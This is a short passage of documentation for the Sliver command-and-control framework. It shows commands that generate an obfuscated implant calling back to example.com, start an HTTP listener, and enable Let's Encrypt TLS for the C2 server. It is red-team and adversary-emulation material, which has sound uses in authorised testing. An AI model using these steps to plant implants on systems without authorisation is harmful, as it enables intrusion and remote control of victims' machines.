Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous.

## Generate the Sliver (implant)
Sliver implants are compiled with a hardcoded (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at example.com, run the following:

```
sliver > generate --http example.com

```

## Start the Listener 

```
sliver > http

```

## Static Content

You can manage static content using the `website` command.

## SSL/TLS Certificates

The `http` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.

```
sliver > http --domain example.com --lets-encrypt

```
